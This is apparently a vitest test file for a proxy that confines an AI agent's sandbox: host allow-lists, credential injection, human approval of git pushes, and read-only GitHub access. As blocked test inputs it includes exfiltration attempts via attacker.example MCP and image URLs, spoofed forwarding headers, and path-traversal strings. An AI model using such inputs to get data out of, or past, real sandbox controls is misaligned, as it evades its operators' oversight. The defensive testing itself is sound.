import { exports } from "cloudflare:workers";
import { beforeEach, describe, expect, it, vi } from "vitest";

import { classifyApi, classifyGit, describePush, isLocalItem, parseReceivePack } from "../src/workers/sandbox/outbound";
import { task } from "./helpers";

/** What the proxy let through to the outside world. */
let forwarded: { url: string; method: string; headers: Headers; body: string; redirect?: string }[] = [];
/** What the outside world says next, in order; "upstream ok" once these run out. */
let answers: (() => Response)[] = [];

beforeEach(() => {
  forwarded = [];
  answers = [];
  vi.stubGlobal("fetch", async (input: RequestInfo | URL, init?: RequestInit) => {
    const request = new Request(input as RequestInfo, init);
    forwarded.push({ url: request.url, method: request.method, headers: request.headers, body: await request.text(), redirect: request.redirect });
    return answers.shift()?.() ?? new Response("upstream ok");
  });
});

let counter = 0;
/** A proxy bound to a fresh task, the way each sandbox gets its own. */
async function proxyFor(policy: Parameters<any>[0] = {}) {
  const taskId = `00000000-0000-4000-8000-${String(++counter).padStart(12, "0")}`;
  await task(taskId).configure(policy);
  const proxy = (exports as any).Outbound({ props: { taskId } });
  const send = (url: string, init?: RequestInit) => proxy.fetch(new Request(url, init)) as Promise<Response>;
  const recorded = async (method: string) => (await task(taskId).calls()).filter((c: any) => c.method === method).map((c: any) => c.args);
  /** How often the credential a push goes out under was asked for. */
  const pushAsks = () => task(taskId).tokenAsks() as Promise<number>;
  return { send, recorded, pushAsks };
}

const pkt = (line: string) => (line.length + 4).toString(16).padStart(4, "0") + line;
const A = "a".repeat(40);
const B = "b".repeat(40);
const ZERO = "0".repeat(40);
const pushBody = (...commands: string[]) =>
  new TextEncoder().encode(commands.map((c, i) => pkt(i === 0 ? `${c}\0report-status side-band-64k\n` : `${c}\n`)).join("") + "0000PACK....");

describe("reading a push", () => {
  it("lists exactly which refs would move", () => {
    expect(parseReceivePack(pushBody(`${A} ${B} refs/heads/main`, `${ZERO} ${B} refs/tags/v1`))).toEqual([
      { old: A, new: B, ref: "refs/heads/main" },
      { old: ZERO, new: B, ref: "refs/tags/v1" },
    ]);
  });

  it("reads a push from a shallow clone, which lists its shallow boundary first", () => {
    // Captured from `git push` in a --depth 1 clone (git 2.54).
    const body = new TextEncoder().encode(pkt(`shallow ${A}\n`) + pkt(`${A} ${B} refs/heads/main\0 report-status-v2 side-band-64k quiet object-format=sha1 agent=git/2.54.0\n`) + "0000PACK....");
    expect(parseReceivePack(body)).toEqual([{ old: A, new: B, ref: "refs/heads/main" }]);
    // A shallow line after the commands have started is not part of the grammar.
    const odd = new TextEncoder().encode(pkt(`${A} ${B} refs/heads/main\0caps\n`) + pkt(`shallow ${A}\n`) + "0000");
    expect(parseReceivePack(odd)).toBeUndefined();
  });

  it("refuses to interpret anything it does not fully understand", () => {
    const bytes = (text: string) => new TextEncoder().encode(text);
    expect(parseReceivePack(bytes("not a pkt-line"))).toBeUndefined();
    expect(parseReceivePack(bytes(pkt(`${A} ${B} refs/heads/main\n`)))).toBeUndefined(); // no flush packet
    expect(parseReceivePack(bytes(pkt("push-cert\0report-status\n") + "0000"))).toBeUndefined();
    expect(parseReceivePack(bytes(pkt(`${A} ${B} HEAD\n`) + "0000"))).toBeUndefined();
    expect(parseReceivePack(bytes(pkt(`${A} ${B} refs/heads/a b\n`) + "0000"))).toBeUndefined();
    expect(parseReceivePack(bytes("ffff" + "x".repeat(10)))).toBeUndefined();
  });

  it("describes a push in words a person can decide on", () => {
    // Commit ids are shown whole: this line is what a person approves.
    expect(describePush("acme/demo", [{ old: A, new: B, ref: "refs/heads/main" }])).toBe(`push to acme/demo: move branch main from ${A} to ${B}`);
    expect(describePush("acme/demo", [{ old: A, new: ZERO, ref: "refs/heads/old" }])).toContain("delete branch old");
    expect(describePush("acme/demo", [{ old: ZERO, new: B, ref: "refs/tags/v1" }])).toContain(`create tag v1 at ${B}`);
  });

  it("recognises git endpoints and nothing else on github.com", () => {
    const at = (path: string, method = "GET") => classifyGit(new URL(`https://github.com${path}`), method);
    expect(at("/acme/demo.git/info/refs?service=git-upload-pack")).toMatchObject({ repo: "acme/demo", push: false });
    expect(at("/acme/demo/info/refs?service=git-receive-pack")).toMatchObject({ repo: "acme/demo", push: true });
    expect(at("/acme/demo/git-receive-pack", "POST")).toMatchObject({ push: true });
    expect(at("/acme/demo/git-receive-pack", "GET")).toBeUndefined();
    expect(at("/acme/demo")).toBeUndefined();
    expect(at("/acme/demo/info/refs")).toBeUndefined();
    expect(at("/acme/../info/refs?service=git-upload-pack")).toBeUndefined();
  });
});

describe("what a sandbox can reach", () => {
  it("passes reports home with the task's credential, and nothing else decides whose task it is", async () => {
    const { send, recorded } = await proxyFor();
    const ok = await send("http://brain.internal/callback/progress", { method: "POST", headers: { "x-task-token": "good", "x-task-id": "someone-elses-task" }, body: '{"message":"step 1"}' });
    expect(ok.status).toBe(200);
    expect(await recorded("callback")).toEqual([{ kind: "progress", token: "good", body: { message: "step 1" } }]);
    expect((await send("http://brain.internal/callback/progress", { method: "POST", headers: { "x-task-token": "forged" }, body: "{}" })).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("lends credentials to an exact origin, not to the same host on another port", async () => {
    const { send } = await proxyFor({ repository: "acme/demo" });
    expect((await send("https://model.test:8443/v1/responses", { method: "POST", body: JSON.stringify({ model: "test-model", input: "hi" }) })).status).toBe(403);
    expect((await send("https://github.com:8443/acme/demo.git/info/refs?service=git-upload-pack")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("blocks every other host and records the attempt", async () => {
    const { send, recorded } = await proxyFor();
    expect((await send("https://example.com/")).status).toBe(403);
    expect((await send("http://api.openai.com/v1/responses", { method: "POST", body: "{}" })).status).toBe(403);
    expect(forwarded).toHaveLength(0);
    expect((await recorded("observe")).map((o: any) => o.body.host)).toEqual(["example.com", "api.openai.com"]);
  });
});

describe("after a task has ended", () => {
  it("lets nothing out on its behalf, not even a read", async () => {
    const { send } = await proxyFor({ repository: "acme/demo", ended: true });
    expect((await send("https://model.test/v1/models")).status).toBe(403);
    expect((await send("https://github.com/acme/demo.git/info/refs?service=git-upload-pack")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });
});

describe("the model key", () => {
  const callModel = (send: (url: string, init?: RequestInit) => Promise<Response>, model: string, path = "/v1/responses") =>
    send(`https://model.test${path}`, { method: "POST", headers: { authorization: "Bearer provided-by-worker" }, body: JSON.stringify({ model, input: "hi" }) });

  it("is added by the proxy, replacing whatever the guest sent", async () => {
    const { send } = await proxyFor();
    expect((await callModel(send, "test-model")).status).toBe(200);
    expect(forwarded).toHaveLength(1);
    expect(forwarded[0].headers.get("authorization")).toBe("Bearer test-key");
    expect(JSON.parse(forwarded[0].body)).toEqual({ model: "test-model", input: "hi" });
  });

  it("does not let the guest have the provider reach out on its behalf", async () => {
    const { send } = await proxyFor();
    const withTools = (tools: unknown) => send("https://model.test/v1/responses", { method: "POST", body: JSON.stringify({ model: "test-model", input: "hi", tools }) });
    expect((await withTools([{ type: "function", name: "bash" }])).status).toBe(200);
    expect((await withTools([{ type: "mcp", server_url: "https://attacker.example/mcp" }])).status).toBe(403);
    expect((await withTools([{ type: "function", name: "bash" }, { type: "web_search" }])).status).toBe(403);
    expect((await withTools("not a list")).status).toBe(403);
    // Hosted tools can also be smuggled in as conversation items.
    const withInput = (input: unknown) => send("https://model.test/v1/responses", { method: "POST", body: JSON.stringify({ model: "test-model", input }) });
    expect((await withInput([{ role: "user", content: "hi" }, { type: "function_call", call_id: "c", name: "bash", arguments: "{}" }, { type: "function_call_output", call_id: "c", output: "ok" }, { type: "reasoning", summary: [] }])).status).toBe(200);
    expect((await withInput([{ type: "mcp_approval_response", approve: true, approval_request_id: "x" }])).status).toBe(403);
    expect((await withInput([{ type: "mcp_list_tools", server_label: "x", tools: [] }])).status).toBe(403);
    expect((await withInput(["a string item"])).status).toBe(403);
    // An item given only by id points at something stored on the provider's side.
    expect((await withInput([{ id: "msg_someone_elses" }])).status).toBe(403);
    expect((await withInput([{ type: "item_reference", id: "msg_someone_elses" }])).status).toBe(403);
    expect((await withInput([{ type: "function_call", id: "fc_someone_elses" }])).status).toBe(403);
    // Nothing stored on the provider's side may be referred to: under a shared key it could be anyone's.
    const withField = (extra: Record<string, unknown>) => send("https://model.test/v1/responses", { method: "POST", body: JSON.stringify({ model: "test-model", input: "hi", ...extra }) });
    expect((await withField({ previous_response_id: "resp_someone_elses" })).status).toBe(403);
    expect((await withField({ conversation: "conv_someone_elses" })).status).toBe(403);
    // An image by URL would have the provider fetch an address the guest chose; inline data is fine.
    const image = (image_url: string) => [{ role: "user", content: [{ type: "input_image", image_url }] }];
    expect((await withInput(image("https://attacker.example/x.png?leak=secret"))).status).toBe(403);
    expect((await withInput(image("data:image/png;base64,AAAA"))).status).toBe(200);
    expect((await send("https://model.test/v1/responses/compact", { method: "POST", body: JSON.stringify({ model: "test-model" }) })).status).toBe(403);
    expect(forwarded).toHaveLength(3);
  });

  it("pays only for the configured model, on the model endpoint, within the task's allowance", async () => {
    const { send } = await proxyFor({ modelCalls: 1 });
    expect((await callModel(send, "a-pricier-model")).status).toBe(403);
    expect((await callModel(send, "test-model", "/v1/files")).status).toBe(403);
    expect((await send("https://model.test/v1/responses", { method: "POST", body: "not json" })).status).toBe(403);
    expect(forwarded).toHaveLength(0);
    expect((await callModel(send, "test-model")).status).toBe(200);
    expect((await callModel(send, "test-model")).status).toBe(429);
    expect(forwarded).toHaveLength(1);
  });
});

describe("git over the proxy", () => {
  const advert = "https://github.com/acme/demo.git/info/refs?service=git-upload-pack";
  const push = (send: (url: string, init?: RequestInit) => Promise<Response>, repo = "acme/demo", body: BodyInit = pushBody(`${A} ${B} refs/heads/main`)) =>
    send(`https://github.com/${repo}.git/git-receive-pack`, { method: "POST", body });

  it("lends the token only for the repository the task was started on", async () => {
    const { send } = await proxyFor({ repository: "acme/demo" });
    await send(advert);
    await send("https://github.com/acme/secret.git/info/refs?service=git-upload-pack", { headers: { authorization: "Basic guessed" } });
    expect(forwarded[0].headers.get("authorization")).toBe(`Basic ${btoa("x-access-token:test-github-token")}`);
    expect(forwarded[1].headers.get("authorization")).toBeNull();
  });

  it("asks for what git reads with apart from what a push goes out under, and passes on only the headers git's own exchange needs", async () => {
    // Lent for reading and not for pushing: reading goes out with it, and nothing is asked for of the other kind.
    const { send, pushAsks } = await proxyFor({ repository: "acme/demo", fetchToken: "test-fetch-token", tokenWithdrawnAfter: 0 });
    await send(advert, { headers: { "git-protocol": "version=2", "user-agent": "git/2.50", accept: "*/*", cookie: "a=b", "x-forwarded-for": "1.2.3.4", "x-github-otp": "000000", authorization: "Basic guessed" } });
    await send("https://github.com/acme/demo.git/git-upload-pack", { method: "POST", body: "0000", headers: { "content-type": "application/x-git-upload-pack-request", "x-anything": "else" } });
    expect(forwarded.map((each) => each.headers.get("authorization"))).toEqual([`Basic ${btoa("x-access-token:test-fetch-token")}`, `Basic ${btoa("x-access-token:test-fetch-token")}`]);
    expect([...forwarded[0].headers.keys()].sort()).toEqual(["accept", "authorization", "git-protocol", "user-agent"]);
    expect(forwarded[1].headers.get("content-length")).toBeNull();
    expect(forwarded[1].headers.get("content-type")).toBe("application/x-git-upload-pack-request");
    expect(forwarded[1].headers.get("x-anything")).toBeNull();
    // (The credential a push goes out under was not asked for by either.)
    expect(await pushAsks()).toBe(0);
    // Asking what the remote has, for a push, is of the push's kind: not what reading is lent.
    await send("https://github.com/acme/demo.git/info/refs?service=git-receive-pack");
    expect(forwarded[2].headers.get("authorization")).toBeNull();
    expect(await pushAsks()).toBe(1);
  });

  it("offers nothing on github.com except git", async () => {
    const { send } = await proxyFor({ repository: "acme/demo" });
    expect((await send("https://github.com/acme/demo/settings")).status).toBe(403);
    expect((await send("https://github.com/login/oauth/access_token", { method: "POST", body: "x" })).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("never pushes to a repository the task was not started on", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "allow", reason: "" }] });
    expect((await push(send, "acme/other")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
    expect(await recorded("authorize")).toHaveLength(0);
  });

  it("does not send an approved push if the task's access to the repository was withdrawn while it waited", async () => {
    // The credential is there when the push arrives, and gone by the time someone approves it.
    const { send } = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "pending", reason: "" }, { state: "allow", reason: "ok" }], tokenWithdrawnAfter: 0 });
    const response = await push(send, "acme/demo", pushBody(`${A} ${B} refs/heads/main`));
    expect(response.status).toBe(403);
    expect(await response.text()).toMatch(/no longer allowed a credential/);
    expect(forwarded).toHaveLength(0);
  });

  it("does not send even a push that moves nothing once the task's access was withdrawn", async () => {
    const { send } = await proxyFor({ repository: "acme/demo", tokenWithdrawnAfter: 0 });
    const response = await push(send, "acme/demo", new TextEncoder().encode("0000"));
    expect(response.status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("holds a push until someone approves exactly those refs, then forwards it unchanged", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "pending", reason: "" }, { state: "allow", reason: "ok" }] });
    const body = pushBody(`${A} ${B} refs/heads/main`);
    const response = await push(send, "acme/demo", body);
    expect(response.status).toBe(200);
    const asked = await recorded("authorize");
    expect(asked).toHaveLength(2);
    expect(asked[0]).toMatchObject({ action: "git_push", resource: "acme/demo", refs: [{ old: A, new: B, ref: "refs/heads/main" }] });
    // Both polls belong to the same held request, which has an id of its own.
    expect(asked[0].requestId).toMatch(/^[0-9a-f-]{36}$/);
    expect(asked[1].requestId).toBe(asked[0].requestId);
    expect(forwarded).toHaveLength(1);
    expect(forwarded[0].body).toBe(new TextDecoder().decode(body));
    expect(forwarded[0].headers.get("authorization")).toContain("Basic ");
  });

  it("asks for the credential a push goes out under only once the push is about to be sent: never for one that is refused, cannot be read, or is too large", async () => {
    const approved = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "allow", reason: "ok" }] });
    expect((await push(approved.send)).status).toBe(200);
    expect(await approved.pushAsks()).toBe(1);
    const denied = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "deny", reason: "no" }] });
    expect((await push(denied.send)).status).toBe(403);
    expect(await denied.pushAsks()).toBe(0);
    const unread = await proxyFor({ repository: "acme/demo" });
    expect((await push(unread.send, "acme/demo", "not a push")).status).toBe(403);
    expect(await unread.pushAsks()).toBe(0);
  });

  it("sends nothing for a task that ended while a credential was asked for, when git reads or asks what the remote has", async () => {
    const { send } = await proxyFor({ repository: "acme/demo", ended: true });
    expect((await send(advert)).status).toBe(403);
    expect((await send("https://github.com/acme/demo.git/info/refs?service=git-receive-pack")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("gives two identical pushes two separate questions", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "allow", reason: "" }] });
    await push(send);
    await push(send);
    const [first, second] = await recorded("authorize");
    expect(first.requestId).not.toBe(second.requestId);
  });

  it("does not forward a push that was denied or that it cannot read", async () => {
    const denied = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "deny", reason: "not on main" }] });
    const response = await push(denied.send);
    expect(response.status).toBe(403);
    expect(await response.text()).toContain("not on main");

    const unreadable = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "allow", reason: "" }] });
    expect((await push(unreadable.send, "acme/demo", "garbage")).status).toBe(403);
    expect(await unreadable.recorded("authorize")).toHaveLength(0);
    expect(forwarded).toHaveLength(0);
  });
});

describe("GitHub's API over the proxy", () => {
  const issues = "https://api.github.com/repos/acme/demo/issues?state=all&per_page=100";
  const search = (q: string, more = "") => `https://api.github.com/search/issues?q=${encodeURIComponent(q)}${more}`;
  const found = (repo: string, number: number) => ({ number, title: `t${number}`, repository_url: `https://api.github.com/repos/${repo}` });

  it("recognises reads of one repository and the search of issues, and nothing else", () => {
    const api = (path: string, method = "GET") => classifyApi(new URL(`https://api.github.com${path}`), method);
    expect(api("/repos/acme/demo")).toEqual({ repo: "acme/demo" });
    expect(api("/repos/Acme/Demo/issues/7/comments", "HEAD")).toEqual({ repo: "Acme/Demo" });
    expect(api("/repos/acme/demo/compare/main...topic")).toEqual({ repo: "acme/demo" });
    expect(api("/search/issues")).toEqual({ search: true });
    for (const method of ["POST", "PATCH", "PUT", "DELETE", "OPTIONS"]) expect(api("/repos/acme/demo/issues", method)).toBeUndefined();
    for (const path of ["/", "/user", "/graphql", "/repos/acme", "/repos/../demo/issues", "/repos/acme/../issues", "/repos/acme/demo%2f..%2fsecret/issues", "/repos/acme/demo/contents/a%2e%2e/b", "/repos/acme/demo//issues", "/search/code", "/search/issues/x", "/app/installations/1/access_tokens", "/orgs/acme/repos"])
      expect(api(path), path).toBeUndefined();
    // The other side of a comparison named in another repository is a read of that one.
    for (const path of ["/repos/acme/demo/compare/main...someone:topic", "/repos/acme/demo/compare/main...someone%3Atopic", "/repos/acme/demo/compare/someone:demo:main...topic", "/repos/acme/demo/Compare/main...someone:topic"]) expect(api(path), path).toBeUndefined();
  });

  it("reads the task's own repository with a credential that can only read, and with headers made here", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    expect(await (await send(issues, { headers: { authorization: "Bearer guessed", cookie: "session=1", accept: "application/vnd.github+json", "x-github-api-version": "2022-11-28", "if-none-match": '"abc"', "x-http-method-override": "POST", "x-forwarded-host": "evil.example", "user-agent": "curl/8" } })).text()).toBe("upstream ok");
    expect(forwarded).toHaveLength(1);
    expect(forwarded[0]).toMatchObject({ url: issues, method: "GET", redirect: "manual" });
    expect(Object.fromEntries(forwarded[0].headers)).toEqual({ authorization: "Bearer test-read-token", accept: "application/vnd.github+json", "x-github-api-version": "2022-11-28", "if-none-match": '"abc"', "user-agent": "always-on-agent" });
    expect(await recorded("noteGithubRead")).toEqual([{ kind: "other", status: 200 }]);
  });

  it("reads it with no credential at all where the task is lent none", async () => {
    const { send } = await proxyFor({ repository: "acme/demo", unlent: true, noPublicToken: true });
    await send(issues, { headers: { authorization: "Bearer guessed" } });
    expect(forwarded[0].headers.get("authorization")).toBeNull();
  });

  it("reads what anyone may read with a credential that is allowed nothing, where it is lent none by right, and the rest with none", async () => {
    const { send } = await proxyFor({ repository: "acme/demo", unlent: true });
    const read = async (url: string) => (await send(url), forwarded.at(-1)!.headers.get("authorization"));
    answers.push(() => Response.json({ total_count: 0, incomplete_results: false, items: [] }));
    expect(await read("https://api.github.com/search/issues?q=dst")).toBe("Bearer test-public-token");
    for (const path of ["issues?state=all", "issues/7", "issues/7/comments", "issues/comments", "issues/comments/55", "pulls", "pulls/3", "pulls/3/comments", "pulls/comments", "Issues/7"]) expect(await read(`https://api.github.com/repos/acme/demo/${path}`), path).toBe("Bearer test-public-token");
    // Its files, who works on it, what it is: only by right. As anyone would see them.
    for (const path of ["contents/README.md", "collaborators", "", "commits", "issuesx", "pulls-and-more"]) expect(await read(`https://api.github.com/repos/acme/demo${path ? `/${path}` : ""}`), path).toBeNull();
    // Nor anything else under them: only what is named. Nor a listing narrowed by anything but the plain ways.
    for (const path of ["issues/7/timeline", "issues/7/events", "issues/events", "issues/7/issue-field-values", "issues/7/labels", "issues/7/reactions", "issues/7/comments/9", "pulls/3/files", "pulls/3/reviews", "pulls/3/commits", "issues/x", "issues?state=open&field=priority", "pulls?custom=1"]) expect(await read(`https://api.github.com/repos/acme/demo/${path}`), path).toBeNull();
    answers.push(() => Response.json({ total_count: 0, incomplete_results: false, items: [] }));
    expect(await read("https://api.github.com/search/issues?q=dst&fields=x")).toBeNull();
    // What only some may see of an issue is taken out of what is read that way, in a listing, in one issue and in a search.
    const json = { headers: { "content-type": "application/json; charset=utf-8" } };
    answers.push(() => Response.json([{ number: 7, title: "t", issue_field_values: [{ name: "priority", value: "secret" }], user: { login: "a" } }], json));
    expect(await (await send("https://api.github.com/repos/acme/demo/issues?state=all")).json()).toEqual([{ number: 7, title: "t", user: { login: "a" } }]);
    answers.push(() => Response.json({ number: 7, issue_field_values: [{ value: "secret" }], sub: { issue_fields: 1, kept: 2 } }, json));
    expect(await (await send("https://api.github.com/repos/acme/demo/issues/7")).json()).toEqual({ number: 7, sub: { kept: 2 } });
    answers.push(() => Response.json({ total_count: 1, incomplete_results: false, items: [{ number: 7, repository_url: "https://api.github.com/repos/acme/demo", issue_field_values: [{ value: "secret" }] }] }));
    expect(JSON.stringify(await (await send("https://api.github.com/search/issues?q=dst")).json())).not.toContain("secret");
    // An answer that is not a description that can be gone through is not passed on as it is.
    const noted = await proxyFor({ repository: "acme/demo", unlent: true });
    answers.push(() => new Response("raw", { headers: { "content-type": "text/plain" } }));
    expect((await noted.send("https://api.github.com/repos/acme/demo/issues/7")).status).toBe(502);
    expect(await noted.recorded("noteGithubRead")).toEqual([{ kind: "other", status: 502 }]);
    // The same where it breaks off on its way after its headers have come: told, and counted once.
    answers.push(() => new Response(new ReadableStream({ start: (controller) => (controller.enqueue(new TextEncoder().encode("ra")), controller.error(new Error("reset"))) }), { headers: { "content-type": "text/plain" } }));
    expect((await noted.send("https://api.github.com/repos/acme/demo/issues/7")).status).toBe(502);
    expect(await noted.recorded("noteGithubRead")).toEqual([{ kind: "other", status: 502 }, { kind: "other", status: 502 }]);
    // Asked for in another form than a description (a pull request as its diff): read as a stranger would, and passed on as it is.
    for (const accept of ["application/vnd.github.diff", "application/vnd.github.patch", "text/html", "application/vnd.github+json, application/vnd.github.diff"]) {
      answers.push(() => new Response("diff --git a/x b/x", { headers: { "content-type": "application/vnd.github.diff" } }));
      const answer = await send("https://api.github.com/repos/acme/demo/pulls/3", { headers: { accept } });
      expect(forwarded.at(-1)!.headers.get("authorization"), accept).toBeNull();
      expect(await answer.text()).toBe("diff --git a/x b/x");
    }
    for (const accept of ["application/vnd.github+json", "application/json", "*/*", "application/vnd.github.raw+json; charset=utf-8", "application/vnd.github.v3+json"]) {
      answers.push(() => Response.json({ number: 3 }, json));
      await send("https://api.github.com/repos/acme/demo/pulls/3", { headers: { accept } });
      expect(forwarded.at(-1)!.headers.get("authorization"), accept).toBe("Bearer test-public-token");
    }
    // Lent one by right, it is that one for everything, and what it is given is passed on whole.
    const lent = await proxyFor({ repository: "acme/demo" });
    await lent.send(issues);
    expect(forwarded.at(-1)!.headers.get("authorization")).toBe("Bearer test-read-token");
    answers.push(() => Response.json([{ number: 7, issue_field_values: [{ value: "theirs to see" }] }], json));
    expect(JSON.stringify(await (await lent.send("https://api.github.com/repos/acme/demo/issues/7/timeline")).json())).toContain("theirs to see");
    // Turned away as the installation: asked again as a stranger, and that is the answer the task gets.
    const refused = await proxyFor({ repository: "acme/demo", unlent: true });
    for (const status of [403, 401, 422]) {
      const before = forwarded.length;
      answers.push(() => Response.json({ message: "Resource not accessible by integration" }, { status, headers: { "x-ratelimit-limit": "5000", "x-ratelimit-remaining": "4990" } }));
      answers.push(() => Response.json({ message: "Not Found" }, { status: 404, headers: { "x-ratelimit-limit": "60", "x-ratelimit-remaining": "59" } }));
      const answer = await refused.send(issues);
      expect(answer.status).toBe(404);
      expect(answer.headers.get("x-ratelimit-limit")).toBe("60");
      expect(await answer.text()).not.toContain("integration");
      expect(forwarded.slice(before).map((each) => each.headers.get("authorization"))).toEqual(["Bearer test-public-token", null]);
    }
    // What a stranger then gets is passed on as a stranger's: whatever it is, with nothing taken out of it.
    answers.push(() => Response.json({ message: "Resource not accessible by integration" }, { status: 403, headers: { "x-ratelimit-remaining": "4990" } }));
    answers.push(() => new Response("as it is", { headers: { "content-type": "text/plain" } }));
    expect(await (await refused.send(issues)).text()).toBe("as it is");
    // Not there, said to the credential: that is what a stranger is told too, and it is not asked again.
    const once404 = forwarded.length;
    answers.push(() => Response.json({ message: "Not Found" }, { status: 404, headers: { "x-ratelimit-remaining": "4990" } }));
    expect((await refused.send("https://api.github.com/repos/acme/demo/issues/999999")).status).toBe(404);
    expect(forwarded).toHaveLength(once404 + 1);
    // Told to slow down is told as that, and not asked again: by the allowance being used up, by a time to wait, or only in words (with allowance left and no time named).
    const before = forwarded.length;
    answers.push(() => Response.json({ message: "API rate limit exceeded" }, { status: 403, headers: { "x-ratelimit-remaining": "0" } }));
    expect((await refused.send(issues)).status).toBe(403);
    answers.push(() => Response.json({ message: "You have exceeded a secondary rate limit. Please wait a few minutes before you try again." }, { status: 403, headers: { "x-ratelimit-remaining": "4990" } }));
    const secondary = await refused.send(issues);
    expect(secondary.status).toBe(403);
    expect(((await secondary.json()) as { message: string }).message).toContain("secondary rate limit");
    answers.push(() => Response.json({ message: "wait" }, { status: 403, headers: { "retry-after": "60", "x-ratelimit-remaining": "10" } }));
    expect((await refused.send(issues)).headers.get("retry-after")).toBe("60");
    expect(forwarded).toHaveLength(before + 3);
    // Turned away with no words to say why (none sent, or they could not be read): left at that, and asked once only.
    const once = forwarded.length;
    answers.push(() => new Response(null, { status: 403, headers: { "x-ratelimit-remaining": "4990" } }));
    expect((await refused.send(issues)).status).toBe(403);
    answers.push(() => new Response(new ReadableStream({ start: (controller) => controller.error(new Error("reset")) }), { status: 403, headers: { "x-ratelimit-remaining": "4990" } }));
    expect((await refused.send(issues)).status).toBe(403);
    expect(forwarded).toHaveLength(once + 2);
    // Asked for by its headers alone, it is asked as a stranger from the start: once, with no credential.
    answers.push(() => new Response(null, { status: 403, headers: { "x-ratelimit-remaining": "4990" } }));
    expect((await refused.send(issues, { method: "HEAD" })).status).toBe(403);
    expect(forwarded.slice(once + 2).map((each) => [each.method, each.headers.get("authorization")])).toEqual([["HEAD", null]]);
    // By right, a refusal is what it is: nothing is asked a second time.
    answers.push(() => Response.json({ message: "Resource not accessible by integration" }, { status: 403 }));
    expect((await lent.send(issues)).status).toBe(403);
    expect(forwarded).toHaveLength(before + 7);
    // Such a one cannot be had: read with none, as it would have been. Not a failure.
    const none = await proxyFor({ repository: "acme/demo", unlent: true, noPublicToken: true });
    expect((await none.send(issues)).status).toBe(200);
    expect(forwarded.at(-1)!.headers.get("authorization")).toBeNull();
  });

  it("writes nothing, and reads no other repository nor anything else there", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    expect((await send("https://api.github.com/repos/acme/demo/issues", { method: "POST", body: "{}" })).status).toBe(403);
    expect((await send("https://api.github.com/repos/acme/demo/issues/1/comments", { method: "POST", body: "{}" })).status).toBe(403);
    expect((await send("https://api.github.com/graphql", { method: "POST", body: "{}" })).status).toBe(403);
    expect((await send("https://api.github.com/repos/acme/other/issues")).status).toBe(403);
    expect((await send("https://api.github.com/user")).status).toBe(403);
    expect((await send("https://api.github.com:8443/repos/acme/demo/issues")).status).toBe(403);
    expect((await send("http://api.github.com/repos/acme/demo/issues")).status).toBe(403);
    expect((await send("https://api.github.com/repos/acme/demo/compare/main...someone:topic")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
    expect(await recorded("observe")).toHaveLength(8);
    // A task with no repository reads none.
    const bare = await proxyFor({});
    expect((await bare.send(issues)).status).toBe(403);
    expect((await bare.send(search("bug"))).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("lets nothing through once the task has ended, also when it ends while a credential is asked for", async () => {
    const ended = await proxyFor({ repository: "acme/demo", ended: true });
    expect((await ended.send(issues)).status).toBe(403);
    // No credential is what a task that is lent none gets, and what one that has ended gets: the second is not read for anonymously.
    const ending = await proxyFor({ repository: "acme/demo", endsWhileLending: true });
    expect((await ending.send(issues)).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("does not pass on an address somewhere else that it is answered with", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    // An archive of a private repository: an address good for a while for whoever holds it.
    answers.push(() => new Response(null, { status: 302, headers: { location: "https://codeload.github.com/acme/demo/legacy.tar.gz/main?token=SIGNED" } }));
    const answer = await send("https://api.github.com/repos/acme/demo/tarball/main", { redirect: "manual" });
    expect(answer.status).toBe(403);
    expect(answer.headers.get("location")).toBeNull();
    expect(await answer.text()).not.toContain("SIGNED");
    // One to another place on the API itself (a repository that was renamed) is handed back for the guest to ask again.
    answers.push(() => new Response(null, { status: 301, headers: { location: "https://api.github.com/repositories/42/issues" } }));
    const moved = await send(issues, { redirect: "manual" });
    expect(moved.status).toBe(301);
    expect(moved.headers.get("location")).toBe("https://api.github.com/repositories/42/issues");
    // Which is then not a path it may read.
    expect((await send("https://api.github.com/repositories/42/issues")).status).toBe(403);
    expect(forwarded).toHaveLength(2);
    expect(await recorded("noteGithubRead")).toEqual([
      { kind: "other", status: 302 },
      { kind: "other", status: 301 },
    ]);
  });

  it("takes out of a file or a directory read with a credential the address it could be downloaded from", async () => {
    const { send } = await proxyFor({ repository: "acme/demo" });
    const signed = "https://raw.githubusercontent.com/acme/demo/main/a.txt?token=SIGNED";
    const json = { headers: { "content-type": "application/json; charset=utf-8" } };
    answers.push(() => Response.json({ name: "a.txt", content: "aGk=", download_url: signed }, json));
    expect(await (await send("https://api.github.com/repos/acme/demo/contents/a.txt?ref=main")).json()).toEqual({ name: "a.txt", content: "aGk=", download_url: null });
    answers.push(() => Response.json([{ name: "a.txt", download_url: signed }, { name: "dir", download_url: null }], json));
    expect(await (await send("https://api.github.com/repos/acme/demo/contents/")).json()).toEqual([{ name: "a.txt", download_url: null }, { name: "dir", download_url: null }]);
    answers.push(() => Response.json({ name: "README.md", download_url: signed }, json));
    expect(JSON.stringify(await (await send("https://api.github.com/repos/acme/demo/readme")).json())).not.toContain("SIGNED");
    // Asked for as the file itself: that is its content, passed on.
    answers.push(() => new Response("hi", { headers: { "content-type": "application/vnd.github.raw" } }));
    expect(await (await send("https://api.github.com/repos/acme/demo/contents/a.txt", { headers: { accept: "application/vnd.github.raw" } })).text()).toBe("hi");
    // A directory asked for as an object lists its files inside it; a licence has one too.
